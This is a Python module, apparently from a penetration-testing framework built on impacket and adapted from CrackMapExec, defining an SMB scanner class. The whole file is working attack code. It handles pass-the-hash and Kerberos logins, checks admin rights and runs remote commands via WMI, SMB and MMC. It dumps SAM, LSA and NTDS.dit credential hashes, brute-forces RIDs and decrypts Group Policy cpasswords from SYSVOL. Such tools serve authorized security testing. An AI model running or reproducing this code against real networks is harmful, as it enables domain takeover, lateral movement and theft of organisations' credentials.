import os.path
import logging
from time import sleep
import socket
import traceback
import struct
import ntpath
import xml.etree.ElementTree as ET
from io import BytesIO
from Cryptodome.Cipher import AES
from base64 import b64decode
from binascii import unhexlify

import impacket
from impacket.smbconnection import SessionError, SMBConnection
from impacket.nmb import NetBIOSTimeout, NetBIOSError
from impacket.smb import SMB_DIALECT
from impacket.smb3structs import SMB2_DIALECT_21
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets, NTDSHashes

from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5 import constants
from impacket.krb5.types import Principal


from .exec.smbexec import SMBEXEC
from .exec.wmiexec import WMIEXEC
from .exec.mmcexec import MMCEXEC
from .enum import Enum
from .spns import GetUserSPNs
from .wmi import WMI
from utils.output import Output
from utils.utils import AuthFailure, sizeof_fmt, gen_random_string

"""
Lot of code here taken from CME, @byt3bl33d3r did an awesome job with impacket
"""

class SMBScan:

    def __init__(self, hostname, port, timeout, use_smbv1=True):
        self.hostname = hostname
        self.port = port
        self.timeout = timeout

        if use_smbv1:
            self.prefered_dialect = SMB_DIALECT
        else:
            self.prefered_dialect = SMB2_DIALECT_21

        self.conn = None
        self.authenticated = False
        self.smbv1 = None
        self.creds = None
        self.is_admin = False

        self.remote_ops = None
        self.bootkey = None

    def url(self, path=None):
        if path:
            return "smb://%s:%d%s" % (self.hostname, self.port, path)
        else:
            return "smb://%s:%d" % (self.hostname, self.port)

    def auth(self, domain='WORKGROUP', username=None, password=None, hash=None):
        if not self.conn:
            Output.write({'target': self.url(), 'message': 'enum_host_info(): please connect first'})

        self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]

        success = False
        is_admin = False

        try:
            if username == None or username == '':
                self.conn.login('' , '')
                try:
                    self.is_admin = self.check_if_admin(domain, '', '', hash)
                except impacket.nmb.NetBIOSError:
                    self.is_admin = False
                except impacket.smbconnection.SessionError as e:
                    self.is_admin = False
                self.creds = {'username': '', 'password': '', 'domain': domain}
                success = True
            else:
                if password != None:
                    self.conn.login(username, password, domain)
                    self.creds = {'username': username, 'password': password, 'domain': domain}
                elif hash != None:
                    if not ':' in hash:
                        nt_hash = hash
                        lm_hash = 'aad3b435b51404eeaad3b435b51404ee'
                    else:
                        nt_hash = hash.split(':')[1]
                        lm_hash = hash.split(':')[0]

                    self.conn.login(username, '', domain, lm_hash, nt_hash)
                    self.creds = {'username': username, 'hash': hash, 'domain': domain}
                success = True

                self.is_admin = self.check_if_admin(domain, username, password, hash)

        except impacket.smbconnection.SessionError as e:
            error, desc = e.getErrorString()
            if 'STATUS_ACCESS_DENIED' in str(error):
                # Can happen on both login() and check_if_admin() 
                pass
            elif 'STATUS_NO_SUCH_FILE' in str(error):
                # Can happen with check_if_admin
                pass
            else:
                raise AuthFailure(error)
        except impacket.nmb.NetBIOSTimeout as e:
            success = False
            raise AuthFailure("%s" % type(e))
        except TypeError as e:
            # occurs when a SMB SessionError: STATUS_LOGON_FAILURE in another exception
            success = False
            raise AuthFailure("%s" % type(e))
        except Exception as e:
            success = False
            Output.write({'target': self.url(), 'message': "%s:%s\n%s" % (type(e), str(e), traceback.format_exc())})
            raise AuthFailure("%s: %s" % (type(e), e))

        self.authenticated = success

        return success, self.is_admin

    def kerberos_auth(self, dc_ip=None):
        if not self.conn:
            Output.write({'target': self.url(), 'message': 'enum_host_info(): please connect first'})

        self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]

        success = False
        self.is_admin = False

        domain = ''
        username = ''

        try:
            self.conn.kerberosLogin(username, '', domain, '', '', None, dc_ip)
            success = True

            self.creds = {'kerberos': True, 'dc_ip': dc_ip}

            self.is_admin = self.check_if_admin(kerberos=True, dc_ip=dc_ip)
        except impacket.krb5.kerberosv5.KerberosError as e:
            success = False
            if "KDC_ERR_S_PRINCIPAL_UNKNOWN" in str(e):
                Output.error({'target': self.url(), 'message': "KDC_ERR_S_PRINCIPAL_UNKNOWN received, you should specify the server FQDN instead of the IP"})
                raise AuthFailure("KDC_ERR_S_PRINCIPAL_UNKNOWN")
            elif "KDC_ERR_WRONG_REALM" in str(e):
                Output.error({'target': self.url(), 'message': "KDC_ERR_WRONG_REALM received, you should define the DC ip with --dc-ip"})
                raise AuthFailure("KDC_ERR_WRONG_REALM")
            else:
                Output.write({'target': self.url(), 'message': "%s:%s\n%s" % (type(e), str(e), traceback.format_exc())})
                raise AuthFailure("%s: %s" % (type(e), e))
        except Exception as e:
            success = False
            Output.write({'target': self.url(), 'message': "%s:%s\n%s" % (type(e), str(e), traceback.format_exc())})
            raise AuthFailure("%s: %s" % (type(e), e))

        self.authenticated = success

        return success, self.is_admin

    def get_server_info(self):
        if not self.conn:
            self.conn()
        if not self.authenticated:
            try:
                self.auth()
            except AuthFailure:
                pass

        self.domain    = self.conn.getServerDNSDomainName()
        hostname  = self.conn.getServerName()
        try:
            server_os = str(self.conn._SMBConnection.get_server_lanman())
        except:
            server_os = str(self.conn.getServerOS())
        signing   = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection['RequireSigning']

        if not self.domain:
            self.domain = hostname

        smb_info = {}
        smb_info['domain'] = self.domain.strip()
        smb_info['hostname'] = hostname.strip()
        smb_info['server_os'] = server_os.strip()
        smb_info['signing'] = signing
        smb_info['smbv1'] = self.smbv1

        return smb_info


    def connect(self):
        try:
            self.conn = SMBConnection(self.hostname, self.hostname, None, self.port, timeout=self.timeout, preferredDialect=self.prefered_dialect)

            if self.prefered_dialect == SMB_DIALECT:
                self.smbv1 = True
            else:
                self.smbv1 = False

            return True
        except (NetBIOSError, socket.error, struct.error, ConnectionResetError, TypeError, impacket.nmb.NetBIOSTimeout) as e:
            if self.prefered_dialect == SMB_DIALECT:
                # SMBv1 didn't work, try SMBv2
                self.prefered_dialect = SMB2_DIALECT_21

                return self.connect()
            else:
                return False

        except Exception as e:
            Output.write({'target': self.url(), 'message': "%s:%s\n%s" % (type(e), str(e), traceback.format_exc())})
            return False

    def disconnect(self):
        if self.conn:
            try:
                '''
                    DC's seem to want us to logoff first, windows workstations sometimes reset the connection
                    (go home Windows, you're drunk)
                '''
                self.conn.logoff()
            except:
                pass

            self.smbv1 = None
            self.authenticated = False
            self.conn = None
            self.creds = None
            self.is_admin = False

            self.remote_ops = None
            self.bootkey = None

    def check_if_admin(self, domain='', username='', password='', hash=None, kerberos=False, dc_ip=None):
        admin_privs = False

        stringBinding = r'ncacn_np:{}[\pipe\svcctl]'.format(self.hostname)

        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        rpctransport.setRemoteHost(self.hostname)
        rpctransport.set_dport(self.port)

        lmhash = ''
        nthash = ''
        if hash != None:
            if not ':' in hash:
                nthash = hash
                lmhash = 'aad3b435b51404eeaad3b435b51404ee'
            else:
                nthash = hash.split(':')[1]
                lmhash = hash.split(':')[0]

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(username, password, domain, lmhash, nthash, None)
            pass
        rpctransport.set_kerberos(kerberos, dc_ip)
        try:
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)

            lpMachineName = '{}\x00'.format(self.hostname)

            # 0xF003F - SC_MANAGER_ALL_ACCESS
            # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx

            resp = scmr.hROpenSCManagerW(dce, lpMachineName, 'ServicesActive\x00', 0xF003F)
            admin_privs = True
        except DCERPCException as e:
            print("%s: %s" % (type(e), str(e)))
            pass

        return admin_privs

    def gettgt(self):
        if self.authenticated:
            try:
                domain = self.creds['domain'] if 'domain' in self.creds else 'WORKGROUP'
                username = self.creds['username'] if 'username' in self.creds else ''
                password = self.creds['password'] if 'password' in self.creds else ''
                hash = self.creds['hash'] if 'hash' in self.creds else ''
                lmhash = ''
                nthash = ''
                if hash != '':
                    if not ':' in hash:
                        nthash = hash
                        lmhash = 'aad3b435b51404eeaad3b435b51404ee'
                    else:
                        nthash = hash.split(':')[1]
                        lmhash = hash.split(':')[0]

                username_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)


                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(username_principal, password, domain,
                                                                    unhexlify(lmhash), unhexlify(nthash), '',
                                                                    self.hostname)

                ccache = CCache()

                ccache.fromTGT(tgt, oldSessionKey, oldSessionKey)
                ticket_file = "%s_%s.ccache" % (domain, username)
                Output.highlight({'target': self.url(), 'message': "Saving TGT to %s" % ticket_file})
                ccache.saveFile(ticket_file)
            except Exception as e:
                print("%s: %s" % (type(e), str(e)))
        else:
            Output.write({'target': self.url(), 'message': "getTGT error: Not authenticated"})

    def list_shares(self):
        temp_dir = ntpath.normpath("\\" + gen_random_string())

        try:
            for share in self.conn.listShares():
                share_name = share['shi1_netname'][:-1]
                share_remark = share['shi1_remark'][:-1]
                share_info = {'name': share_name, 'remark': share_remark, 'access': []}
                read = False
                write = False

                if share_name != 'IPC$':
                    try:
                        self.conn.listPath(share_name, '\\*')
                        read = True
                        share_info['access'].append('READ')
                    except SessionError:
                        pass
                    except impacket.nmb.NetBIOSError:
                        pass
                    except BrokenPipeError:
                        pass

                    try:
                        self.conn.createDirectory(share_name, temp_dir)
                        self.conn.deleteDirectory(share_name, temp_dir)
                        write = True
                        share_info['access'].append('WRITE')
                    except SessionError:
                        pass
                    except BrokenPipeError:
                        pass
                    except impacket.nmb.NetBIOSError:
                        pass

                yield share_info

        except Exception as e:
            raise e

    def list_content(self, path="\\", share=None, recurse=3):
        if not share:
            return
        try:
            has_content = False

            try:
                if path[-1] == '\\':
                    request_path = path + "*"
                else:
                    request_path = path + "\\*"
                contents = self.conn.listPath(share, request_path)
            except SessionError as e:
                if 'STATUS_ACCESS_DENIED' not in str(e):
                    Output.write({'target': self.url(), 'message': "Failed listing files on share {} in directory {}: {}".format(share, path, e)})
                else:
                    Output.write({'target': self.url(), 'message': "Failed listing files on share {} in directory {}: Access denied".format(share, path)})
                return
            except impacket.nmb.NetBIOSError as e:
                Output.write({'target': self.url(), 'message': "Failed listing files on share {} in directory {}: {}".format(share, path, e)})
                return
            except BrokenPipeError as e:
                Output.write({'target': self.url(), 'message': "Failed listing files on share {} in directory {}: {}".format(share, path, e)})
                return

            for content in contents:
                has_content = True

                filename = content.get_longname()
                if path.endswith('\\'):
                    filepath = "%s%s" % (path, filename)
                else:
                    filepath = "%s\\%s" % (path, filename)
                is_readonly = content.is_readonly()
                is_directory = content.is_directory()

                if filename in ['.', '..']:
                    continue

                if not is_directory:
                    size = content.get_filesize()
                    yield {'type': 'file', 'name': filepath, 'size': size}
                else:
                    if not filepath.endswith('\\'):
                        filepath = "%s\\" % filepath

                    #yield {'type': 'folder', 'name': filepath}

                    if recurse <= 0:
                        yield {'type': 'folder', 'name': filepath}
                        pass
                    else:
                        c = False
                        for data in self.list_content(path=filepath, share=share, recurse=recurse-1):
                            c = True
                            yield data
                        if not c:
                            yield {'type': 'folder', 'name': filepath}

            #if not has_content and path != '\\':
            #    yield {'type': 'folder', 'name': path}

        except Exception as e:
            raise e

    def exec(self, command, exec_method=None, get_output=True):

        if not exec_method:
            exec_methods = ['wmiexec', 'smbexec', 'mmcexec']
        else:
            exec_methods = [exec_method]

        smb_share = "C$"
        domain = self.creds['domain'] if 'domain' in self.creds else ''
        username = self.creds['username'] if 'username' in self.creds else ''
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''
        do_kerberos = self.creds['kerberos'] if 'kerberos' in self.creds else False
        dc_ip = self.creds['dc_ip'] if 'dc_ip' in self.creds else None

        output = None
        exec = None

        for method in exec_methods:
            if method == 'wmiexec':
                try:
                    exec = WMIEXEC(self.hostname, username, password, domain, self.conn, hash, smb_share, do_kerberos)
                    break
                except Exception as e:
                    if 'access_denied' in str(e):
                        Output.write({'target': self.url(), 'message': "Error execution command via wmiexec: Access denied"})
                    else:
                        Output.write({'target': self.url(), 'message': "Error execution command via wmiexec:\n%s" % traceback.format_exc()})
                    continue
            elif method == 'smbexec':
                try:
                    exec = SMBEXEC(self.hostname, username, password, domain, hash, smb_share, doKerberos=do_kerberos, kdcHost=dc_ip)
                    break
                except Exception as e:
                    if 'access_denied' in str(e):
                        Output.write({'target': self.url(), 'message': "Error execution command via smbexec: Access denied"})
                    else:
                        Output.write({'target': self.url(), 'message': "Error execution command via smbexec:\n%s" % traceback.format_exc()})
                    continue
            elif method == 'mmcexec':
                try:
                    exec = MMCEXEC(self.hostname, username, password, domain, self.conn, hash, smb_share, doKerberos=do_kerberos)
                    break
                except Exception as e:
                    if 'access_denied' in str(e):
                        Output.write({'target': self.url(), 'message': "Error execution command via mmcexec: Access denied"})
                    else:
                        Output.write({'target': self.url(), 'message': "Error execution command via mmcexec:\n%s" % traceback.format_exc()})
                    continue
            else:
                Output.write({'target': self.url(), 'message': "Unknown execution method: %s" % method})

        if exec == None:
            return None

        output = exec.execute(command, get_output)
        if output == None:
            return None
        return output

    def enable_remoteops(self):
        if self.remote_ops is not None and self.bootkey is not None:
            return

        do_kerberos = self.creds['kerberos'] if 'kerberos' in self.creds else False
        dc_ip = self.creds['dc_ip'] if 'dc_ip' in self.creds else None

        try:
            self.remote_ops  = RemoteOperations(self.conn, do_kerberos, dc_ip) #self.__doKerberos, self.__kdcHost
            self.remote_ops.enableRegistry()
            self.bootkey = self.remote_ops.getBootKey()
        except Exception as e:
            raise e

    def dump_sam(self):
        self.enable_remoteops()

        sam_entries = []
        def new_sam_hash(sam_hash):
            username,_,lmhash,nthash,_,_,_ = sam_hash.split(':')
            sam_entries.append({'username': username, 'hash': ':'.join((lmhash, nthash))})

        if self.remote_ops and self.bootkey:
            SAMFileName = self.remote_ops.saveSAM()
            SAM = SAMHashes(SAMFileName, self.bootkey, isRemote=True, perSecretCallback=lambda secret: new_sam_hash(secret))

            SAM.dump()

            try:
                self.remote_ops.finish()
            except Exception as e:
                print("Error calling remote_ops.finish(): {}".format(e))

            self.remote_ops = None
            self.bootkey = None

            SAM.finish()

        return sam_entries

    def dump_lsa(self):
        self.enable_remoteops()

        lsa_entries = []
        def new_lsa_secret(secret):
            lsa_entries.append({'secret': secret})

        if self.remote_ops and self.bootkey:

            SECURITYFileName = self.remote_ops.saveSECURITY()

            LSA = LSASecrets(SECURITYFileName, self.bootkey, self.remote_ops, isRemote=True,
                             perSecretCallback=lambda secretType, secret: new_lsa_secret(secret))

            LSA.dumpCachedHashes()
            LSA.dumpSecrets()

            try:
                self.remote_ops.finish()
            except Exception as e:
                print("Error calling remote_ops.finish(): {}".format(e))

            self.remote_ops = None
            self.bootkey = None

            LSA.finish()

        return lsa_entries

    def enum_users(self):
        if self.conn == None:
            return
        if self.creds == None:
            return


        username = self.creds['username'] if 'username' in self.creds else ''
        domain = self.creds['domain'] if 'domain' in self.creds else ''
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''
        do_kerberos = self.creds['kerberos'] if 'kerberos' in self.creds else False

        enum = Enum(self.hostname, self.port, domain, username, password, hash, self.conn, do_kerberos)

        for user in enum.enumUsers():
            yield user

    def enum_groups(self):
        if self.conn == None:
            return
        if self.creds == None:
            return

        username = self.creds['username'] if 'username' in self.creds else ''
        domain = self.creds['domain'] if 'domain' in self.creds else ''
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''
        do_kerberos = self.creds['kerberos'] if 'kerberos' in self.creds else False

        enum = Enum(self.hostname, self.port, domain, username, password, hash, self.conn, do_kerberos)

        for group in enum.enumGroups():
            yield group

    def enum_admins(self):
        if self.conn == None:
            return
        if self.creds == None:
            return

        username = self.creds['username'] if 'username' in self.creds else ''
        domain = self.creds['domain'] if 'domain' in self.creds else ''
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''
        do_kerberos = self.creds['kerberos'] if 'kerberos' in self.creds else False

        enum = Enum(self.hostname, self.port, domain, username, password, hash, self.conn, do_kerberos)

        for user in enum.enumAdmins():
            yield user

    def enum_processes(self):
        if self.conn == None:
            return
        if self.creds == None:
            return

        username = self.creds['username'] if 'username' in self.creds else ''
        domain = self.creds['domain'] if 'domain' in self.creds else ''
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''
        do_kerberos = self.creds['kerberos'] if 'kerberos' in self.creds else False

        wmi = WMI(self.hostname, username, password, domain, hashes=hash, doKerberos=do_kerberos)

        for process in wmi.enumProcesses():
            yield process


    def enum_password_policy(self):
        if self.conn == None:
            return
        if self.creds == None:
            return

        username = self.creds['username'] if 'username' in self.creds else ''
        domain = self.creds['domain'] if 'domain' in self.creds else ''
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''
        do_kerberos = self.creds['kerberos'] if 'kerberos' in self.creds else False

        enum = Enum(self.hostname, self.port, domain, username, password, hash, self.conn, do_kerberos)

        return enum.enumPasswordPolicy()

    def enum_loggedin(self):
        if self.conn == None:
            return
        if self.creds == None:
            return

        username = self.creds['username'] if 'username' in self.creds else ''
        domain = self.creds['domain'] if 'domain' in self.creds else ''
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''
        do_kerberos = self.creds['kerberos'] if 'kerberos' in self.creds else False

        enum = Enum(self.hostname, self.port, domain, username, password, hash, self.conn, do_kerberos)

        for logged in enum.enumLoggedIn():
            yield logged

    def enum_sessions(self):
        if self.conn == None:
            return
        if self.creds == None:
            return

        username = self.creds['username'] if 'username' in self.creds else ''
        domain = self.creds['domain'] if 'domain' in self.creds else ''
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''
        do_kerberos = self.creds['kerberos'] if 'kerberos' in self.creds else False

        enum = Enum(self.hostname, self.port, domain, username, password, hash, self.conn, do_kerberos)

        for session in enum.enumSessions():
            yield session

    def list_spns(self, baseDN=None):
        if self.conn == None:
            return
        if self.creds == None:
            return

        username = self.creds['username'] if 'username' in self.creds else ''
        domain = self.creds['domain'] if 'domain' in self.creds else ''
        password = self.creds['password'] if 'password' in self.creds else ''

        get_spns = GetUserSPNs(self.hostname, username, password, domain, baseDN)

        for spn in get_spns.run():
            yield spn

    def rid_bruteforce(self, start, end):
        if self.conn == None:
            return
        if self.creds == None:
            return

        username = self.creds['username'] if 'username' in self.creds else ''
        domain = self.creds['domain'] if 'domain' in self.creds else ''
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''
        do_kerberos = self.creds['kerberos'] if 'kerberos' in self.creds else False

        enum = Enum(self.hostname, self.port, domain, username, password, hash, self.conn, do_kerberos)

        for entry in enum.RIDBruteforce(start, end):
            yield entry


    def list_gpps(self):
        sysvol_found = False
        for share in self.list_shares():
            if share['name'] == 'SYSVOL' and 'READ' in share['access']:
                sysvol_found = True
                break

        if not sysvol_found:
            print('No access to SYSVOL share')
            return

        gpp_files = []
        for path in self.list_content('\\', 'SYSVOL', recurse=10):
            filename = path['name'].split('\\')[-1]
            if filename in ['Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml']:
                gpp_files.append(path['name'])

        for path in gpp_files:
            buf = BytesIO()
            self.conn.getFile('SYSVOL', path, buf.write)
            xml = ET.fromstring(buf.getvalue())

            if 'Groups.xml' in path:
                xml_section = xml.findall("./User/Properties")

            elif 'Services.xml' in path:
                xml_section = xml.findall('./NTService/Properties')

            elif 'ScheduledTasks.xml' in path:
                xml_section = xml.findall('./Task/Properties')

            elif 'DataSources.xml' in path:
                xml_section = xml.findall('./DataSource/Properties')

            elif 'Printers.xml' in path:
                xml_section = xml.findall('./SharedPrinter/Properties')

            elif 'Drives.xml' in path:
                xml_section = xml.findall('./Drive/Properties')

            for attr in xml_section:
                props = attr.attrib

                if 'cpassword' in props:

                    for user_tag in ['userName', 'accountName', 'runAs', 'username']:
                        if user_tag in props:
                            username = props[user_tag]

                    password = self.__decrypt_cpassword(props['cpassword'])

                    yield {
                        'username': username,
                        'password': password,
                        'path': path,
                    }

    def __decrypt_cpassword(self, cpassword):

        #Stolen from hhttps://gist.github.com/andreafortuna/4d32100ae03abead52e8f3f61ab70385

        # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
        key = unhexlify('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
        cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
        password = b64decode(cpassword)
        IV = "\x00" * 16
        decrypted = AES.new(key, AES.MODE_CBC, IV.encode("utf8")).decrypt(password)
        padding_bytes = decrypted[-1]
        decrypted = decrypted[:-padding_bytes]
        return decrypted.decode('utf16')

    def dump_ntds(self, method, callback_func=None):
        self.enable_remoteops()
        use_vss_method = False
        NTDSFileName   = None

        def add_ntds_hash(ntds_hash):
            try:
                add_ntds_hash.ntds_hashes += 1
                if ntds_hash.find('$') == -1:
                    if ntds_hash.find('\\') != -1:
                        domain, hash = ntds_hash.split('\\')
                    else:
                        domain = self.domain
                        hash = ntds_hash

                    try:
                        username,_,lmhash,nthash,_,_,_ = hash.split(':')
                        parsed_hash = ':'.join((lmhash, nthash))
                        if callback_func != None:
                            callback_func({'domain': domain, 'username': username, 'hash': parsed_hash, 'hash_type': 'ntlm'})
                    except ValueError:
                        username,hash_type,parsed_hash = hash.split(':')
                        if callback_func != None:
                            callback_func({'domain': domain, 'username': username, 'hash': parsed_hash, 'hash_type': hash_type})

                    #if validate_ntlm(parsed_hash):
                    #    print('%s %s' % username, parsed_hash)
                    #raise
                else:
                    logging.debug("Dumped hash is a computer account, not adding to db")
            except Exception as e:
                print('%s: %s' % (type(e), e))
        add_ntds_hash.ntds_hashes = 0

        if self.remote_ops and self.bootkey:
            try:
                if method == 'vss':
                    NTDSFileName = self.remote_ops.saveNTDS()
                    use_vss_method = True

                NTDS = NTDSHashes(NTDSFileName, self.bootkey, isRemote=True, history=False, noLMHash=True,
                                 remoteOps=self.remote_ops, useVSSMethod=use_vss_method, justNTLM=False,
                                 pwdLastSet=False, resumeSession=None, justUser=None, printUserStatus=False,
                                 perSecretCallback = lambda secretType, secret : add_ntds_hash(secret))

                #print('Dumping the NTDS, this could take a while so go grab a redbull...')
                NTDS.dump()

                #print('Dumped {} NTDS hashes'.format(add_ntds_hash.ntds_hashes))

            except Exception as e:
                #if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                #    resumeFile = NTDS.getResumeSessionFile()
                #    if resumeFile is not None:
                #        os.unlink(resumeFile)
                raise e

            try:
                self.remote_ops.finish()
            except Exception as e:
                logging.debug("Error calling remote_ops.finish(): {}".format(e))

            NTDS.finish()

            return add_ntds_hash.ntds_hashes
